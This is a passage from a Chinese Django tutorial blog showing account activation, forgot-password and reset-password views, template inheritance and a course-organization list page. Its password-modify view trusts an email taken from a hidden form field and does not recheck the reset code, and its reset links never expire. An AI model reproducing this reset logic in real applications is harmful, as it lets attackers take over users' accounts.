class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># 激活用户的view</span><br><span class="line">class ActiveUserView(View):</span><br><span class="line">    def get(self, request, active_code):</span><br><span class="line">        # 查询邮箱验证记录是否存在</span><br><span class="line">        all_record &#x3D; EmailVerifyRecord.objects.filter(code &#x3D; active_code)</span><br><span class="line">        # 激活form负责给激活跳转进来的人加验证码</span><br><span class="line">        active_form &#x3D; ActiveForm(request.GET)</span><br><span class="line">        # 如果不为空也就是有用户</span><br><span class="line">        if all_record:</span><br><span class="line">            for record in all_record:</span><br><span class="line">                # 获取到对应的邮箱</span><br><span class="line">                email &#x3D; record.email</span><br><span class="line">                # 查找到邮箱对应的user</span><br><span class="line">                user &#x3D; UserProfile.objects.get(email&#x3D;email)</span><br><span class="line">                user.is_active &#x3D; True</span><br><span class="line">                user.save()</span><br><span class="line">                # 激活成功跳转到登录页面</span><br><span class="line">                return render(request, &quot;login.html&quot;, )</span><br><span class="line">        # 自己瞎输的验证码</span><br><span class="line">        else:</span><br><span class="line">            return render(request, &quot;register.html&quot;, &#123;&quot;msg&quot;: &quot;您的激活链接无效&quot;,&quot;active_form&quot;: active_form&#125;)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>配置用户激活的url并通过url提取到变量:</p><p>django1.9.8:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 激活用户url</span><br><span class="line">url(r&#39;^active&#x2F;(?P&lt;active_code&gt;.*)&#x2F;$&#39;,ActiveUserView.as_view(), name&#x3D; &quot;user_active&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>django2.0.1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 激活用户url</span><br><span class="line">re_path(&#39;active&#x2F;(?P&lt;active_code&gt;.*)&#x2F;&#39;, ActiveUserView.as_view(), name&#x3D; &quot;user_active&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里通过<code>?p</code>将后面<code>.*</code>代表全部提取的正则，符合的内容传入参数active_code中<code>/$</code>代表以<code>/$</code>为结尾</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-0c97bd29b85eac60.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/552" alt="img"></p><blockquote><p>其他细节根据自己需要进行优化。</p></blockquote><p>注册功能制作完毕。</p><h2 id="密码找回"><a href="#密码找回" class="headerlink" title="密码找回"></a>密码找回</h2><h3 id="拷入forgetpassword页面"><a href="#拷入forgetpassword页面" class="headerlink" title="拷入forgetpassword页面"></a>拷入forgetpassword页面</h3><h3 id="书写处理忘记密码的view"><a href="#书写处理忘记密码的view" class="headerlink" title="书写处理忘记密码的view"></a>书写处理忘记密码的view</h3><p>users/views.py</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 用户忘记密码的处理view</span><br><span class="line">class ForgetPwdView(View):</span><br><span class="line">    # get方法直接返回页面</span><br><span class="line">    def get(self, request):</span><br><span class="line">        return render(request, &quot;forgetpwd.html&quot;, &#123; &#125;)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>django2.0.1 urls中配置:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 忘记密码</span><br><span class="line">path(&#39;forget&#x2F;&#39;, ForgetPwdView.as_view(), name&#x3D; &quot;forget_pwd&quot;),</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Django1.9.8 urls中配置:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 忘记密码</span><br><span class="line">url(&#39;forget&#x2F;$&#39;, ForgetPwdView.as_view(), name&#x3D;&quot;forget_pwd&quot;),</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="login-html中忘记密码"><a href="#login-html中忘记密码" class="headerlink" title="login html中忘记密码"></a>login html中忘记密码</h4><p><img src="https://upload-images.jianshu.io/upload_images/1779926-d744609e96a86e01.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/395" alt="img"></p><h4 id="配置忘记密码页面中静态文件。"><a href="#配置忘记密码页面中静态文件。" class="headerlink" title="配置忘记密码页面中静态文件。"></a>配置忘记密码页面中静态文件。</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">load static</span><br><span class="line">修改static的目录</span><br><span class="line">修改其中的url</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="定义一个给forget的form"><a href="#定义一个给forget的form" class="headerlink" title="定义一个给forget的form"></a>定义一个给forget的form</h4><p>users/forms.py:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 注册验证码实现</span><br><span class="line">class ForgetForm(forms.Form):</span><br><span class="line">    # 此处email与前端name需保持一致。</span><br><span class="line">    email &#x3D; forms.EmailField(required&#x3D;True)</span><br><span class="line">    # 应用验证码 自定义错误输出key必须与异常一样</span><br><span class="line">    captcha &#x3D; CaptchaField(error_messages&#x3D;&#123;&quot;invalid&quot;: u&quot;验证码错误&quot;&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="添加验证码"><a href="#添加验证码" class="headerlink" title="添加验证码"></a>添加验证码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 用户忘记密码的处理view</span><br><span class="line">class ForgetPwdView(View):</span><br><span class="line">    # get方法直接返回页面</span><br><span class="line">    def get(self, request):</span><br><span class="line">        forget_from &#x3D; ForgetForm()</span><br><span class="line">        return render(request, &quot;forgetpwd.html&quot;, &#123;&quot;forget_from&quot;:forget_from &#125;)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="html中加上验证码"><a href="#html中加上验证码" class="headerlink" title="html中加上验证码"></a>html中加上验证码</h4><p><img src="https://upload-images.jianshu.io/upload_images/1779926-ac402410d27431d9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/391" alt="img"></p><h4 id="post中逻辑"><a href="#post中逻辑" class="headerlink" title="post中逻辑"></a>post中逻辑</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># post方法实现</span><br><span class="line">def post(self, request):</span><br><span class="line">    forget_form &#x3D; ForgetForm(request.POST)</span><br><span class="line">    # form验证合法情况下取出email</span><br><span class="line">    if forget_form.is_valid():</span><br><span class="line">        email &#x3D; request.POST.get(&quot;email&quot;,&quot;&quot;)</span><br><span class="line">        # 发送找回密码邮件</span><br><span class="line">        send_register_eamil(email, &quot;forget&quot;)</span><br><span class="line">        # 发送完毕返回登录页面并显示发送邮件成功。</span><br><span class="line">        return render(request, &quot;login.html&quot;, &#123;&quot;msg&quot;:&quot;重置密码邮件已发送,请注意查收&quot;&#125;)</span><br><span class="line">    # 如果表单验证失败也就是他验证码输错等。</span><br><span class="line">    else:</span><br><span class="line">        return render(request, &quot;forgetpwd.html&quot;, &#123;&quot;forget_from&quot;: forget_form &#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="邮箱重置密码邮件发送"><a href="#邮箱重置密码邮件发送" class="headerlink" title="邮箱重置密码邮件发送"></a>邮箱重置密码邮件发送</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">elif send_type &#x3D;&#x3D; &quot;forget&quot;:</span><br><span class="line">       email_title &#x3D; &quot;mtianyan慕课小站 找回密码链接&quot;</span><br><span class="line">       email_body &#x3D; loader.render_to_string(</span><br><span class="line">           &quot;email_forget.html&quot;,  # 需要渲染的html模板</span><br><span class="line">           &#123;</span><br><span class="line">               &quot;active_code&quot;: code  # 参数</span><br><span class="line">           &#125;</span><br><span class="line">       )</span><br><span class="line">       msg &#x3D; EmailMessage(email_title, email_body, EMAIL_FROM, [email])</span><br><span class="line">       msg.content_subtype &#x3D; &quot;html&quot;</span><br><span class="line">       send_status &#x3D; msg.send()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/1779926-37697402c2c1d340.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/684" alt="img"></p><h4 id="前端页面添加错误信息"><a href="#前端页面添加错误信息" class="headerlink" title="前端页面添加错误信息"></a>前端页面添加错误信息</h4><p>已经重复很多遍这个操作了。</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-ca1308d1a60c0514.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/451" alt="img"></p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-710fe9c11f1c0592.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/700" alt="img"></p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-9862123a3651aacd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/700" alt="img"></p><blockquote><p>上述三图进行改正，不一一列举</p></blockquote><h4 id="书写重置密码view"><a href="#书写重置密码view" class="headerlink" title="书写重置密码view"></a>书写重置密码view</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 重置密码的view</span><br><span class="line">class ResetView(View):</span><br><span class="line">    def get(self, request, active_code):</span><br><span class="line">        # 查询邮箱验证记录是否存在</span><br><span class="line">        all_record &#x3D; EmailVerifyRecord.objects.filter(code&#x3D;active_code)</span><br><span class="line">        # 如果不为空也就是有用户</span><br><span class="line">        active_form &#x3D; ActiveForm(request.GET)</span><br><span class="line">        if all_record:</span><br><span class="line">            for record in all_record:</span><br><span class="line">                # 获取到对应的邮箱</span><br><span class="line">                email &#x3D; record.email</span><br><span class="line">                # 将email传回来</span><br><span class="line">                return render(request, &quot;password_reset.html&quot;, &#123;&quot;email&quot;:email&#125;)</span><br><span class="line">        # 自己瞎输的验证码</span><br><span class="line">        else:</span><br><span class="line">            return render(</span><br><span class="line">                request, &quot;forgetpwd.html&quot;, &#123;</span><br><span class="line">                    &quot;msg&quot;: &quot;您的重置密码链接无效,请重新请求&quot;, &quot;active_form&quot;: active_form&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="配置重置密码url"><a href="#配置重置密码url" class="headerlink" title="配置重置密码url"></a>配置重置密码url</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># Django1.9.8:</span><br><span class="line">    # 重置密码urlc ：用来接收来自邮箱的重置链接</span><br><span class="line">    url(&#39;reset&#x2F;(?P&lt;active_code&gt;.*)&#x2F;$&#39;, ResetView.as_view(), name&#x3D;&quot;reset_pwd&quot;),</span><br><span class="line"># django2.0.1:</span><br><span class="line"></span><br><span class="line">    # 重置密码urlc ：用来接收来自邮箱的重置链接</span><br><span class="line">    re_path(&#39;reset&#x2F;(?P&lt;active_code&gt;.*)&#x2F;&#39;, ResetView.as_view(), name&#x3D;&quot;reset_pwd&quot;),</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="拷贝进来password-reset页面"><a href="#拷贝进来password-reset页面" class="headerlink" title="拷贝进来password reset页面"></a>拷贝进来password reset页面</h4><p><img src="https://upload-images.jianshu.io/upload_images/1779926-50e2bac45215f39b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/448" alt="img"></p><blockquote><p>添加一个隐藏的input框，以便于我们知道到底是哪个用户在重置密码</p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/1779926-e56d852474ebd343.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/423" alt="img"></p><p>配置html中三大变化加url配置。</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-c1257a82940c3eec.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/619" alt="img"></p><p><code>reset</code>的<code>url</code>需要我们传参进来,但是<code>modify</code>的不需要。<br>所以url配置和view都得分开。</p><h4 id="创建改变密码的forms"><a href="#创建改变密码的forms" class="headerlink" title="创建改变密码的forms:"></a>创建改变密码的forms:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 重置密码form实现</span><br><span class="line">class ModifyPwdForm(forms.Form):</span><br><span class="line">    # 密码不能小于5位</span><br><span class="line">    password1 &#x3D; forms.CharField(required&#x3D;True, min_length&#x3D;5)</span><br><span class="line">    # 密码不能小于5位</span><br><span class="line">    password2 &#x3D; forms.CharField(required&#x3D;True, min_length&#x3D;5)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="书写改变密码的view；"><a href="#书写改变密码的view；" class="headerlink" title="书写改变密码的view；"></a>书写改变密码的view；</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> # 改变密码的view</span><br><span class="line">class ModifyPwdView(View):</span><br><span class="line">    def post(self, request):</span><br><span class="line">        modiypwd_form &#x3D; ModifyPwdForm(request.POST)</span><br><span class="line">        if modiypwd_form.is_valid():</span><br><span class="line">            pwd1 &#x3D; request.POST.get(&quot;password1&quot;, &quot;&quot;)</span><br><span class="line">            pwd2 &#x3D; request.POST.get(&quot;password2&quot;, &quot;&quot;)</span><br><span class="line">            email &#x3D; request.POST.get(&quot;email&quot;, &quot;&quot;)</span><br><span class="line">            # 如果两次密码不相等，返回错误信息</span><br><span class="line">            if pwd1 !&#x3D; pwd2:</span><br><span class="line">                return render(request, &quot;password_reset.html&quot;, &#123;&quot;email&quot;: email, &quot;msg&quot;: &quot;密码不一致&quot;&#125;)</span><br><span class="line">            # 如果密码一致</span><br><span class="line">            user &#x3D; UserProfile.objects.get(email&#x3D;email)</span><br><span class="line">            # 加密成密文</span><br><span class="line">            user.password &#x3D; make_password(pwd2)</span><br><span class="line">            # save保存到数据库</span><br><span class="line">            user.save()</span><br><span class="line">            return render(request, &quot;login.html&quot;, &#123;&quot;msg&quot;: &quot;密码修改成功，请登录&quot;&#125;)</span><br><span class="line">        # 验证失败说明密码位数不够。</span><br><span class="line">        else:</span><br><span class="line">            email &#x3D; request.POST.get(&quot;email&quot;, &quot;&quot;)</span><br><span class="line">            return render(request, &quot;password_reset.html&quot;, &#123;&quot;email&quot;: email, &quot;modiypwd_form&quot;:modiypwd_form&#125;)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="配置modify的url。"><a href="#配置modify的url。" class="headerlink" title="配置modify的url。"></a>配置modify的url。</h4><p>django2.0.1:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 修改密码url; 用于passwordreset页面提交表单</span><br><span class="line">path(&#39;modify_pwd&#x2F;&#39;, ModifyPwdView.as_view(), name&#x3D;&quot;modify_pwd&quot;),</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>django1.9.8:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 修改密码url; 用于passwordreset页面提交表单</span><br><span class="line">url(r&#39;^modify_pwd&#x2F;$&#39;, ModifyPwdView.as_view(), name&#x3D;&quot;modify_pwd&quot;),</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>建议自行走一遍注册，登录，忘记密码。重置密码。<br>错误的激活链接，错误的重置链接。值回填，form报错</p><p>更多: 重置密码链接是否被点击过，过期时间。</p><h1 id="完成授课机构的功能实现"><a href="#完成授课机构的功能实现" class="headerlink" title="完成授课机构的功能实现"></a><center>完成授课机构的功能实现</center></h1><h2 id="django-templates模板继承1"><a href="#django-templates模板继承1" class="headerlink" title="django templates模板继承1"></a>django templates模板继承1</h2><ul><li>机构可以筛选类别</li><li>机构可以根据所在地区进行分类</li></ul><p>右侧我要学习功能: form表单提交<br>右下：授课机构排名</p><p>页面头部与底部为全局头和全局底部。</p><h3 id="Django-template-共用头部底部机制"><a href="#Django-template-共用头部底部机制" class="headerlink" title="Django template 共用头部底部机制"></a>Django template 共用头部底部机制</h3><p>将head和foot放在两个html中，然后在写其他需要这两个部分的页面时include进来。</p><p>Django也是支持include机制的。</p><h3 id="include的问题"><a href="#include的问题" class="headerlink" title="include的问题"></a>include的问题</h3><p>include的进来的死页面，这时候该怎么办？</p><p>解决这种问题：进行模板的继承机制。定义一个父类的框架，子类可以替换其中一部分block，子类只需要重写自己需要改变的block。</p><h3 id="template中新建base-html"><a href="#template中新建base-html" class="headerlink" title="template中新建base.html"></a>template中新建base.html</h3><p>将课程机构列表页。orglist拷贝进template目录</p><p>将orglist内容替换base内容。</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-0269443b69f80570.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/239" alt="img"></p><p>将div收起来</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-5f1ccbc5794f87d0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/220" alt="img"></p><p>loadstaticfiles &amp; 修改静态文件路径为static</p><blockquote><p>这个步骤做过太多遍了，自行完成。耐心就行了。</p></blockquote><h3 id="定义父模板-包含head-amp-footer"><a href="#定义父模板-包含head-amp-footer" class="headerlink" title="定义父模板: 包含head &amp; footer"></a>定义父模板: 包含head &amp; footer</h3><p>title应该是可以被子页面替换的所以要包起来。</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-9a1dbc2dbfe1fa24.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/481" alt="img"></p><p>css有共用的部分，也有可以被子页面替换的部分。</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-b6a74b2bb63653fa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/341" alt="img"></p><p>js同理</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-af7f46dd38bd5f8e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/289" alt="img"></p><p>面包屑是需要被各个页面自己替换的。</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-0f082eed1f72b00b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/188" alt="img"></p><p>将正文内容包起来；</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-20d387c6bff07d56.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/174" alt="img"></p><p>此时base页面就制作好了</p><h2 id="开始orglist编写"><a href="#开始orglist编写" class="headerlink" title="开始orglist编写"></a>开始orglist编写</h2><p>第一步:清空所有内容</p><ul><li>继承base页面</li></ul><p><img src="https://upload-images.jianshu.io/upload_images/1779926-3e2e112cf2c39350.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/253" alt="img"></p><ul><li>覆盖父类的title</li></ul><p><img src="https://upload-images.jianshu.io/upload_images/1779926-392bc373f442d09a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/199" alt="img"></p><ul><li>书写课程机构view<br>organization/views.py</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># encoding: utf-8</span><br><span class="line">from django.views.generic.base import View</span><br><span class="line"># 处理课程机构列表的view</span><br><span class="line">class OrgView(View):</span><br><span class="line">    def get(self,request):</span><br><span class="line">        return render(request, &quot;org-list.html&quot;, &#123; &#125;)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>Django2.0.1配置课程机构首页url</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 课程机构首页url</span><br><span class="line">path(&#39;org_list&#x2F;&#39;, OrgView.as_view(), name&#x3D;&quot;org_list&quot;),</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>Django1.9.8配置url：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 课程机构首页url</span><br><span class="line">url(r&#39;^org_list&#x2F;$&#39;, OrgView.as_view(), name&#x3D;&quot;org_list&quot;),</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="修改面包屑"><a href="#修改面包屑" class="headerlink" title="修改面包屑"></a>修改面包屑</h3><ul><li>base中只保留首页</li><li>org中重写block custom_bread</li><li>block之间没有先后顺序。</li><li>将base中block content拿到orglist重写</li></ul><p><img src="https://upload-images.jianshu.io/upload_images/1779926-29b97ffccbb18776.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/196" alt="img"></p><ul><li>然后将base中block中间section删除掉</li></ul><p><img src="https://upload-images.jianshu.io/upload_images/1779926-cab5c7f004fcd239.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/299" alt="img"></p><blockquote><p>orglist开始loadstaticfiles</p></blockquote><p><code>ctrl+d</code>快速删除</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-a863b3cbdeec1219.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/244" alt="img"></p><p>页面的继承关系使得变量也可以直接用</p><blockquote><p>比如user中的form数据传递到register文件当中.如果register继承的是base页面。<br>base页面当中也是可以用这些数据的。<code>参数的向上传递</code></p></blockquote><p>每个request对象都会传递到html中来，如果继承了base，request也会向上传递到base。<br>base中就可以加入我们的逻辑: 用户是否登录等。</p><p>小节结束对应commit:</p><blockquote><p>完成Django templates的继承关系了解，机构列表展示页。对应7-1 &amp; 2</p></blockquote><h2 id="课程机构列表页数据展示1"><a href="#课程机构列表页数据展示1" class="headerlink" title="课程机构列表页数据展示1"></a>课程机构列表页数据展示1</h2><p>确定由后台传过来的动态数据:</p><p>授课机构列表本身， 授课机构的排名，所在地区(后台取出所有地区), 机构类别写成静态，因为一般不怎么变动。</p><p>在xadmin中添加城市信息，课程信息。</p><p>添加城市</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-00b5504640872151.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/454" alt="img"></p><p>添加机构。</p><p>插播知识点：</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-1a4a3bb3db05e42e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/451" alt="img"></p><p>这里指定的路径是一个相对路径</p><p>setting中要配置我们把文件存放在哪个根目录之下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 设置我们上传文件的路径</span><br><span class="line"></span><br><span class="line">MEDIA_URL &#x3D; &#39;&#x2F;media&#x2F;&#39;</span><br><span class="line">MEDIA_ROOT &#x3D; os.path.join(BASE_DIR, &#39;media&#39;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在项目根目录创建media文件夹</p><p>在后台上传图片</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-a6681f24ccb16635.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/197" alt="img"></p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-920a803d08e95abe.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/255" alt="img"></p><p>修改机构信息中封面图为logo</p><p>自行添加十个课程机构</p><h3 id="models中添加机构类别"><a href="#models中添加机构类别" class="headerlink" title="models中添加机构类别"></a>models中添加机构类别</h3><p>organization/models.py：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">class CourseOrg(models.Model):</span><br><span class="line">    ORG_CHOICES &#x3D;(</span><br><span class="line">        (&quot;pxjg&quot;, u&quot;培训机构&quot;),</span><br><span class="line">        (&quot;gx&quot;, u&quot;高校&quot;),</span><br><span class="line">        (&quot;gr&quot;, u&quot;个人&quot;),</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    name &#x3D; models.CharField(max_length&#x3D;50, verbose_name&#x3D;u&quot;机构名称&quot;)</span><br><span class="line">    # 机构描述，后面会替换为富文本展示</span><br><span class="line">    desc &#x3D; models.TextField(verbose_name&#x3D;u&quot;机构描述&quot;)</span><br><span class="line">    # 机构类别:</span><br><span class="line">    category &#x3D; models.CharField(max_length&#x3D;20, choices&#x3D;ORG_CHOICES, verbose_name&#x3D;u&quot;机构类别&quot;, default&#x3D;&quot;pxjg&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>修改了models之后做数据库的变动:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">makemigrations organization</span><br><span class="line">migrate organization</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/1779926-6d38fe7fbc30dcd9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/352" alt="img"></p><p>完成之后打开Navicat进行验证：</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-fc3fadf0c3bf8e27.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/86" alt="img"></p><p>可以看到新增了。</p><h3 id="完善我们的view"><a href="#完善我们的view" class="headerlink" title="完善我们的view"></a>完善我们的view</h3><p>将列表里的静态数据变成后台获取的动态数据</p><p>organization/views.py</p><pre><code>from .models import CourseOrg, CityDictclass OrgView(View):    def get(self,request):        # 查找到所有的课程机构        all_orgs = CourseOrg.objects.all()        # 取出所有的城市        all_citys = CityDict.objects.all()        return render(request, &quot;org-list.html&quot;, &#123;                    &quot;all_orgs&quot;:all_orgs,                    &quot;all_citys&quot;: all_citys,    &#125;)</code></pre><h2 id="课程机构列表页数据展示2"><a href="#课程机构列表页数据展示2" class="headerlink" title="课程机构列表页数据展示2"></a>课程机构列表页数据展示2</h2><h3 id="前去html中进行数据填充"><a href="#前去html中进行数据填充" class="headerlink" title="前去html中进行数据填充"></a>前去html中进行数据填充</h3><p><img src="https://upload-images.jianshu.io/upload_images/1779926-3bc25b1c7b1fb235.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/541" alt="img"></p><blockquote><p>可以看到所有城市是通过a标签，当前选中城市为active。</p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/1779926-40d118e1ee22f368.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/597" alt="img"></p><p>之后把下面的写死的城市删除掉。</p><p><img 